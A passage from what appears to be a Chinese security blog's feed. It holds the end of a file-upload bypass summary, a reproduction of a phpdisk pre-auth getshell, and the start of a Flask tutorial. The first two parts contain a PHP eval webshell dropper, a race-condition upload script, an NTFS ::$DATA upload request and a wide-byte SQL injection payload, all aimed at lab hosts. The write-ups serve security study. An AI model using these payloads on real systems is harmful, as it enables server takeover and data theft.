class="hljs-meta">?&gt;</span></code></pre><p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">"./info.php"</span>, <span class="hljs-string">"w"</span>), <span class="hljs-string">'&lt;?php @eval($_POST["drops"]) ?&gt;'</span>); <span class="hljs-meta">?&gt;</span></code></pre><p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> threading<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RaceCondition</span><span class="hljs-params">(threading.Thread)</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span>        threading.Thread.__init__(self)        self.url = <span class="hljs-string">"http://127.0.0.1:8080/upload/shell0.php"</span>        self.uploadUrl = <span class="hljs-string">"http://127.0.0.1:8080/upload/copy.php"</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_get</span><span class="hljs-params">(self)</span>:</span>        print(<span class="hljs-string">'try to call uploaded file...'</span>)        r = requests.get(self.url)        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:            print(<span class="hljs-string">"[*]create file info.php success"</span>)            os._exit(<span class="hljs-number">0</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_upload</span><span class="hljs-params">(self)</span>:</span>        print(<span class="hljs-string">"upload file....."</span>)        file = &#123;<span class="hljs-string">"file"</span>:open(<span class="hljs-string">"shell0.php"</span>,<span class="hljs-string">"r"</span>)&#125;        requests.post(self.uploadUrl, files=file)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):                self._get()            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):                self._upload()                self._get()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    threads = <span class="hljs-number">20</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(threads):        t = RaceCondition()        t.start()    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(threads):        t.join()</code></pre><h1 id="解析漏洞总结"><a href="#解析漏洞总结" class="headerlink" title="解析漏洞总结"></a>解析漏洞总结</h1><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>Apache 1.x &amp; 2.x：当Apache遇到不认识的后缀名时，如：1.php.xx，会从后往前依次尝试解析，直到发现认识的php后缀名，遂当做PHP脚本解析。(apache认识的后缀名储存在/etc/mime.types)</p><h2 id="新版本apache解析漏洞"><a href="#新版本apache解析漏洞" class="headerlink" title="新版本apache解析漏洞"></a>新版本apache解析漏洞</h2><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch \.php$&gt;</span>    <span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre><p>文件名后缀burpsuite hex添加<code>\x0A</code>,访问<code>/1.php%0A</code>成功解析。因为$匹配<code>&#39;\n&#39;</code>或<code>&#39;\r&#39;</code></p><h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><p>当文件名为<code>*.asp;1.jpg</code>类型的格式时，会被IIS当做ASP脚本执行</p><h2 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h2><p>a. test.jpg=&gt;test.jpg/x.php进行解析攻击。<br>b. 低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</p><h1 id="文件上传其他知识点"><a href="#文件上传其他知识点" class="headerlink" title="文件上传其他知识点"></a>文件上传其他知识点</h1><ol><li>php自包含:<a href="https://www.anquanke.com/post/id/153376" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153376</a><br>阻止move_uploaded_file(file,newloc)删除临时文件<br>利用条件：文件夹可读、可控文件包含点、目录遍历漏洞查看临时文件名</li><li>反序列化上传<br><a href="https://od0d.cn/2019/03/24/session%E5%8F%8D-%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/" target="_blank" rel="noopener">https://od0d.cn/2019/03/24/session%E5%8F%8D-%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/</a></li><li>unlink竞争</li><li>end函数缺陷</li></ol><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><ul><li>白名单机制</li><li>文件名随机重命名，修改为特定后缀名</li><li>检查文件内容</li><li>隐藏文件路径</li><li>保存文件在web目录之外，不能直接访问，防止解析</li><li>将文件保存到第三方</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/164561#h2-1" target="_blank" rel="noopener">对文件上传的一些思考和总结</a></p><p><a href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">文件上传总结</a></p><p><a href="https://ultramangaia.github.io/blog/2018/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html" target="_blank" rel="noopener">解析漏洞与文件上传漏洞</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpdisk前台Getshell(复现)</title>
    <link href="/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/"/>
    <url>/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>翻论坛时候看到一篇前台Getshell审计文章，里面综合的姿势很多，遂复现一波<a href="https://xz.aliyun.com/t/5594#toc-5" target="_blank" rel="noopener">@lz1y</a>。复现时候也是要求自己按正常代码审计来实现，也遇到很多坑。</p><h1 id="PHPDISK"><a href="#PHPDISK" class="headerlink" title="PHPDISK"></a>PHPDISK</h1><p>phpdisk是国内最大的网络存储、云存储系统开发及服务提供商，长期专注于网络存储系统开发，是一套采用PHP和MySQL构建的网络硬盘(文件存储管理)系统，可替代传统的FTP文件管理。友好的界面，操作的便捷深受用户的欢迎。可用于网络上文件办公、共享、传递、查看的多用户文件存储系统。<br>最新版的下载地址为:<br><a href="http://bbs1.phpdisk.com/thread-5384-1-1.html" target="_blank" rel="noopener">http://bbs1.phpdisk.com/thread-5384-1-1.html</a></p><h1 id="路由和全局变量过滤情况"><a href="#路由和全局变量过滤情况" class="headerlink" title="路由和全局变量过滤情况"></a>路由和全局变量过滤情况</h1><p>路由比较简单/文件名?action=xxx<br>存在全局过滤操作dosafe.php，几乎过滤所有的sql注入的参数</p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><blockquote><p>phpstudy<br>windows 10<br>GBK版本</p></blockquote><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><ol><li>从<strong>mydisk.php</strong>为权限判断未<code>exit</code>导致可以越权访问<strong>mydisk.php</strong></li><li>利用windows下的NTFS ADS流trick绕过文件名后缀限制</li><li>通过<strong>phpdisk</strong>的版本<code>iconv</code>编码转化使用不当造成宽字节注入找到后台(已知漏洞)</li></ol><h1 id="windows环境下文件上传绕过"><a href="#windows环境下文件上传绕过" class="headerlink" title="windows环境下文件上传绕过"></a>windows环境下文件上传绕过</h1><p>先通过黑盒审计方式随手上传一个php文件，发现文件名以xxxx.php.txt方式显示。白盒审计找到文件名变化处判断是否可以绕过</p><p><strong>/upload/modules/upload.inc.php</strong></p><pre><code class="hljs arcade"><span class="hljs-symbol">$file</span>_ext = get_real_ext(<span class="hljs-symbol">$file</span>_extension);<span class="hljs-symbol">$dest</span>_file = <span class="hljs-symbol">$file</span>_real_path.<span class="hljs-symbol">$file</span>_store_path.<span class="hljs-symbol">$file</span>_real_name_store.<span class="hljs-symbol">$file</span>_ext;</code></pre><p>溯源操作该变量的关键逻辑和方法<code>get_real_ext</code><br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><pre><code class="hljs ocaml"><span class="hljs-symbol">'filter_extension'</span> =&gt; <span class="hljs-symbol">'asp</span>,asa,aspx,ascx,dtd,xsd,xsl,xslt,<span class="hljs-keyword">as</span>,wml,java,vtm,vtml,jst,<span class="hljs-keyword">asr</span>,php,php3,php4,php5,vb,vbs,jsf,jsp,pl,cgi,js,html,htm,xhtml,xml,css,shtm,cfm,cfml,shtml,bat,sh',</code></pre><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><p>php在window的时候如果文件名+<code>”::$DATA”</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名.且保持<code>”::$DATA”</code>之前的文件名。</p><h1 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h1><p>文件上传入口文件是在mydisk.php，判断用户登录权限为<code>phpdisk_core::user_login()</code>跟进函数查看逻辑<br><img src="./2.png" srcset="/img/loading.gif" alt=""><br>执行完之后进行302跳转，并未结束程序,可以继续执行mydisk.php代码</p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>由于该cms存在gbk版本，有编码操作，全局搜索iconv。如果使用不当可以绕过转义<br>/upload/ajax.php case ‘uploadCloud’下存在宽字节注入.可利用是在else语句，通过base64_encode可以绕过全局sql过滤.<br><img src="./3.png" srcset="/img/loading.gif" alt=""><br>$data值可控，且执行sql语句使用iconv编码为gbk</p><p>跟进sql_arrary($ins)函数，观察sql语句组合情况。使用sprintf格式化，函数返回通过逗号拆分语句<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="越权上传文件"><a href="#越权上传文件" class="headerlink" title="越权上传文件"></a>越权上传文件</h2><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/phpdisk_v7.0_gbk/upload/mydisk.php?item=upload&amp;is_public=0&amp;cate_id=0&amp;subcate_id=0&amp;folder_node=0&amp;folder_id=-1&amp;uid=1</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.168.56.101<span class="hljs-attribute">Content-Length</span>: 747<span class="hljs-attribute">Origin</span>: http://192.168.56.101<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36<span class="hljs-attribute">Content-Type</span>: multipart/form-data; boundary=----------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2<span class="hljs-attribute">Accept</span>: */*<span class="hljs-attribute">X-Requested-With</span>: ShockwaveFlash/32.0.0.207<span class="hljs-attribute">Referer</span>: http://192.168.56.101/phpdisk_v7.0_gbk/upload/mydisk.php?item=upload&amp;is_public=&amp;cate_id=&amp;subcate_id=&amp;folder_node=0&amp;folder_id=-1&amp;uid=1&amp;___t0.043556519769546664<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7<span class="hljs-attribute">Cookie</span>: PHPSESSID=g2jf402oh26ig6pqftcrjsdpr5; XDEBUG_SESSION=PHPSTORM<span class="hljs-attribute">Connection</span>: close------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2<span class="hljs-attribute">Content-Disposition</span>: form-data; name="Filename"<span class="hljs-attribute">shell.php</span><span class="hljs-attribute">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><span class="hljs-attribute">Content-Disposition</span>: form-data; name="desc11"<span class="hljs-attribute">desc112</span><span class="hljs-attribute">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><span class="hljs-attribute">Content-Disposition</span>: form-data; name="task"<span class="hljs-attribute">doupload</span><span class="hljs-attribute">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><span class="hljs-attribute">Content-Disposition</span>: form-data; name="file_id"<span class="hljs-attribute">0</span><span class="hljs-attribute">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><span class="hljs-attribute">Content-Disposition</span>: form-data; name="upload_file"; filename="shell.php::$DATA"<span class="hljs-attribute">Content-Type</span>: application/octet-stream&lt;?php<span class="hljs-attribute">phpinfo();</span><span class="hljs-attribute"></span><span class="hljs-attribute">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><span class="hljs-attribute">Content-Disposition</span>: form-data; name="Upload"Submit Query------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2--</code></pre><p><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h2 id="sql注入获取文件名"><a href="#sql注入获取文件名" class="headerlink" title="sql注入获取文件名"></a>sql注入获取文件名</h2><p>viewfile.php?file_id=1可以显示文件信息,注入回显点为<strong><em>file_descripttion字段</em></strong>。前提是得到fike_id值,可以通过爆破获得。还有一种方法就是在插入payload时候将文件名设置为共享即in_share=1.</p><p>payload</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$a=<span class="hljs-keyword">array</span>(<span class="hljs-string">"file_id"</span>=&gt;<span class="hljs-string">"1000"</span>,<span class="hljs-string">"file_name"</span>=&gt;<span class="hljs-string">"od錦',`in_share`=1,`file_description`=(select x.a from (select concat(file_store_path,file_real_name)a from pd_files where file_extension=0x7068703a3a2444415441)x)#"</span>);</span><span class="php"><span class="hljs-keyword">echo</span> base64_encode(serialize($a));</span></code></pre><h2 id="curl传入data值"><a href="#curl传入data值" class="headerlink" title="curl传入data值"></a>curl传入data值</h2><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><p>从共享文件处找到<strong>od錦</strong>，可得回显的<strong>file_description字段</strong>，得到文件路径和文件名。<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p>访问<a href="http://192.168.56.101/phpdisk_v7.0_gbk/upload/filestores/2019/07/09/4265f571116622aa7ca543ecb18f4f6a.php" target="_blank" rel="noopener">http://192.168.56.101/phpdisk_v7.0_gbk/upload/filestores/2019/07/09/4265f571116622aa7ca543ecb18f4f6a.php</a><br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>程序代码如３０２跳转如果未正确exit导致越权</li><li>phpstorm动态审计找到<strong>文件名判断或修改</strong>处进行溯源</li><li><a href="https://xz.aliyun.com/t/2539" target="_blank" rel="noopener">https://xz.aliyun.com/t/2539</a> Windows下的NTFS ADS流</li><li>身份判断一般出现在文件入口处，分析逻辑判断是否可以越权</li><li>三种后台姿势<pre><code class="hljs pgsql">找到<span class="hljs-keyword">sql</span>注入，注入出真实文件名删除<span class="hljs-keyword">index</span>.htm，达成目录遍历使用Windows下的部分PHP函数的正则匹配（案例：DEDECMS寻找后台）</code></pre></li><li>存在多版本是否查询是否存在编码转换操作不当，可能造成宽字节注入</li><li>还有…别啃无用代码</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flask框架学习笔记</title>
    <link href="/2019/07/08/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2019/07/08/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近大大小小比赛都会出现基于Flask框架的题目，花一下午过一下基础.</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="什么是flask"><a href="#什么是flask" class="headerlink" title="什么是flask"></a>什么是flask</h2><p>Flask是一个用Python编写的Web应用程序框架。 它由 Armin Ronacher 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和Jinja2模板引擎。两者都是Pocco项目。</p><h2 id="WSGI"><a href="#WSGI" class="headerlink" title="WSGI"></a>WSGI</h2><p>Web Server Gateway Interface（Web服务器网关接口，WSGI）已被用作Python Web应用程序开发的标准。 WSGI是Web服务器和Web应用程序之间通用接口的规范。</p><h2 id="Werkzeug"><a href="#Werkzeug" class="headerlink" title="Werkzeug"></a>Werkzeug</h2><p>它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。</p><h2 id="jinjia2"><a href="#jinjia2" class="headerlink" title="jinjia2"></a>jinjia2</h2><p>jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。<br>Flask通常被称为微框架。 它旨在保持应用程序的核心简单且可扩展。Flask没有用于数据库处理的内置抽象层，也没有形成验证支持。相反，Flask支持扩展以向应用程序添加此类功能。</p><p>#　开发环境virtualenv</p><ol><li>安装virtualenv<pre><code class="hljs shell">pip install virtualenv</code></pre></li><li>创建虚拟环境<pre><code class="hljs shell">mkdir newprojcd newprojvirtualenv venv```shell3. 激活虚拟环境```shellsource venv/bin/activate</code></pre></li><li>在虚拟环境安装flask<pre><code class="hljs shell">pip install Flask</code></pre></li></ol><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="二、Flask应用"><a href="#二、Flask应用" class="headerlink" title="二、Flask应用"></a>二、Flask应用</h1><p>测试Flask安装</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flaskapp = Flask(__name__)<span class="hljs-meta">@app.route('/')</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_world</span><span class="hljs-params">()</span>:</span>   <span class="hljs-keyword">return</span> <span class="hljs-string">'Hello World’</span><span class="hljs-string"></span><span class="hljs-string">if __name__ == '</span>__main__<span class="hljs-string">':</span><span class="hljs-string">   app.run()</span></code></pre><p>参考链接：<a href="https://foofish.net/python-decorator.html" target="_blank" rel="noopener">https://foofish.net/python-decorator.html</a></p><blockquote><p>1.Flask构造函数使用当前模块(<strong>name</strong>)名称作为参数<br>2.route()函数是一个装饰器，它告诉应用程序哪个URL应该调用相关的函数<br><code>app.route(rule, options)</code><br><code>rule</code>　参数表示与该函数的URL绑定<br><code>options</code> 是要转发给举出Rule对象的参数列表<br>３. Flask类的run()方法在本地开发服务器上运行应用程序<br><code>app.run(host, port, debug, options)</code></p></blockquote><p><code>if __name__ == &#39;__main__&#39;</code>的意思是：当.py文件被直接运行时，<code>if __name__ == &#39;__main__&#39;</code>之下的代码块将被运行；当.py文件以模块形式被导入时，<code>if __name__ == &#39;__main__&#39;</code>之下的代码块不被运行。</p><h1 id="三、Flask路由"><a href="#三、Flask路由" class="headerlink" title="三、Flask路由"></a>三、Flask路由</h1><p>现代Web框架使用路由技术来帮助用户记住程序URL。Flask的<code>route()</code>装饰器用于将URL绑定到函数</p><pre><code class="hljs python"><span class="hljs-meta">@app.route(‘/hello’)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_world</span><span class="hljs-params">()</span>:</span>   <span class="hljs-keyword">return</span> ‘hello world’</code></pre><p>将URL<code>&#39;/hello&#39;</code>规则绑定到<code>hello_world()</code>函数.访问<a href="http://localhost:5000/hello，会将hello_world()函数输出在浏览器" target="_blank" rel="noopener">http://localhost:5000/hello，会将hello_world()函数输出在浏览器</a><br>另一种规则绑定add_url_rule()函数（少了route()函数的语法糖）</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_world</span><span class="hljs-params">()</span>:</span>   <span class="hljs-keyword">return</span> ‘hello world’app.add_url_rule(‘/’, ‘hello’, hello_world)</code></pre><h1 id="四、Flask变量规则"><a href="#四、Flask变量规则" class="headerlink" title="四、Flask变量规则"></a>四、Flask变量规则</h1><p>通过向规则参数添加变量部分，可以动态构建URL。变量标记<code>&lt;variable-name&gt;</code>,最为参数传递到与规则相关联的函数。</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flaskapp = Flask(__name__)<span class="hljs-meta">@app.route('/hello/&lt;name&gt;')</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_name</span><span class="hljs-params">(name)</span>:</span>   <span class="hljs-keyword">return</span> <span class="hljs-string">'Hello %s!'</span> % name<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:   app.run(debug = <span class="hljs-literal">True</span>)</code></pre><p>URL: <a href="http://127.0.0.1:5000/hello/od0d，其中od0d作为参数传入关联函数中。" target="_blank" rel="noopener">http://127.0.0.1:5000/hello/od0d，其中od0d作为参数传入关联函数中。</a></p><h2 id="转换器构建规则"><a href="#转换器构建规则" class="headerlink" title="转换器构建规则"></a>转换器构建规则</h2><ol><li>int 接受整数</li><li>float 接受浮点值</li><li>path 接受用作目录分隔符的斜杠</li></ol><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flaskapp = Flask(__name__)<span class="hljs-meta">@app.route('/blog/&lt;int:postID&gt;')</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_blog</span><span class="hljs-params">(postID)</span>:</span>   <span class="hljs-keyword">return</span> <span class="hljs-string">'Blog Number %d'</span> % postID<span class="hljs-meta">@app.route('/rev/&lt;float:revNo&gt;')</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">revision</span><span class="hljs-params">(revNo)</span>:</span>   <span class="hljs-keyword">return</span> <span class="hljs-string">'Revision Number %f'</span> % revNo<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:   app.run()</code></pre><p>URL:<a href="http://localhost:5000/blog/11" target="_blank" rel="noopener">http://localhost:5000/blog/11</a></p><pre><code class="hljs angelscript">Blog Number <span class="hljs-number">11</span></code></pre><p>URL:<a href="http://localhost:5000/rev/1.1" target="_blank" rel="noopener">http://localhost:5000/rev/1.1</a></p><pre><code class="hljs angelscript">Revision Number <span class="hljs-number">1.100000</span></code></pre><p>Flask的URL规则基于Werkzeug的路由模块。这确保形成的URL是唯一的，并且基于Apache规定的先例。</p><pre><code class="hljs python">app.route(<span class="hljs-string">'/flask'</span>)app.route(<span class="hljs-string">'/python/'</span>)</code></pre><p>第一个访问/flask/会显示404<br>第二个访问/python与/python/均可</p><h1 id="五、Flask-URL构建"><a href="#五、Flask-URL构建" class="headerlink" title="五、Flask URL构建"></a>五、Flask URL构建</h1><p><code>url_for()</code>函数动态构建特定函数的URL。第一个参数为接收函数名称作为第一个参数，而后的一个或多个参数作为URL变量部分</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, redirect, url_forapp = Flask(__name__)<span class="hljs-meta">@app.route('/admin')</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_admin</span><span class="hljs-params">()</span>:</span>   <span class="hljs-keyword">return</span> <span class="hljs-string">'Hello Admin'</span><span class="hljs-meta">@app.route('/&lt;guest&gt;/')</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_guest</span><span class="hljs-params">(guest)</span>:</span>   <span class="hljs-keyword">return</span> <span class="hljs-string">'Hello %s as Guest'</span> % guest<span class="hljs-meta">@app.route('/user/&lt;name&gt;')</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_user</span><span class="hljs-params">(name)</span>:</span>   <span class="hljs-keyword">if</span> name ==<span class="hljs-string">'admin'</span>:      <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'hello_admin'</span>))   <span class="hljs-keyword">else</span>:      <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'hello_guest'</span>,guest = name))<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:   app.run(debug = <span class="hljs-literal">True</span>)</code></pre><p>URL:<a href="http://127.0.0.1:5000/user/admin" target="_blank" rel="noopener">http://127.0.0.1:5000/user/admin</a> =&gt;<a href="http://127.0.0.1:5000/admin" target="_blank" rel="noopener">http://127.0.0.1:5000/admin</a></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Hello Admin</span></code></pre><p>URL:<a href="http://127.0.0.1:5000/user/od0d" target="_blank" rel="noopener">http://127.0.0.1:5000/user/od0d</a> =&gt; <a href="http://127.0.0.1:5000/guest/" target="_blank" rel="noopener">http://127.0.0.1:5000/guest/</a></p><pre><code class="hljs actionscript">Hello od0d <span class="hljs-keyword">as</span> Guest</code></pre><h1 id="六、Flask-HTTP方法"><a href="#六、Flask-HTTP方法" class="headerlink" title="六、Flask HTTP方法"></a>六、Flask HTTP方法</h1><p>默认情况下，Flask路由响应GET请求,但可以在<code>route()</code>修饰器中添加其他方法参数<br><code>GET、HEAD、POST、PUT、DELETE</code></p><h2 id="创建html表单"><a href="#创建html表单" class="headerlink" title="创建html表单"></a>创建html表单</h2><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span> = <span class="hljs-string">"http://localhost:5000/login"</span> <span class="hljs-attr">method</span> = <span class="hljs-string">"post"</span>&gt;</span>         <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Enter Name:<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>         <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">"text"</span> <span class="hljs-attr">name</span> = <span class="hljs-string">"nm"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>         <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span> = <span class="hljs-string">"submit"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>         <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><h2 id="创建接收响应py脚本"><a href="#创建接收响应py脚本" class="headerlink" title="创建接收响应py脚本"></a>创建接收响应py脚本</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, redirect, url_for, requestapp = Flask(__name__)<span class="hljs-meta">@app.route('/success/&lt;name&gt;')</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">success</span><span class="hljs-params">(name)</span>:</span>   <span class="hljs-keyword">return</span> <span class="hljs-string">'welcome %s'</span> % name<span class="hljs-meta">@app.route('/login',methods = ['POST', 'GET'])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">()</span>:</span>   <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'POST'</span>:      user = request.form[<span class="hljs-string">'nm'</span>]      <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'success'</span>,name = user))   <span class="hljs-keyword">else</span>:      user = request.args.get(<span class="hljs-string">'nm'</span>)      <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'success'</span>,name = user))<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:   app.run(debug = <span class="hljs-literal">True</span>)</code></pre><p>POST请求处理:<code>user=request.form[&#39;nm&#39;] (od0d)</code></p><blockquote><p>welcome od0d</p></blockquote><p>GET请求处理:<code>User = request.args.get(‘nm’)</code><br>/login?nm=od0d</p><blockquote><p>welcome od0d</p></blockquote><h1 id="七、Flask-模板"><a href="#七、Flask-模板" class="headerlink" title="七、Flask 模板"></a>七、Flask 模板</h1><p>利用Flask所基于的Jinja2模板引擎的地方。而不是从函数返回硬编码HTML，可以通过<code>render_template()</code>函数呈现HTML文件。</p><p>Web模板包含用于变量和表达式（在这些情况下为Python表达式）的HTML语法散布占位符，这些是在呈现模板时替换的值。<br>在项目中创建文件夹<strong>templates</strong>新建文件<strong>hello.html</strong></p><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype 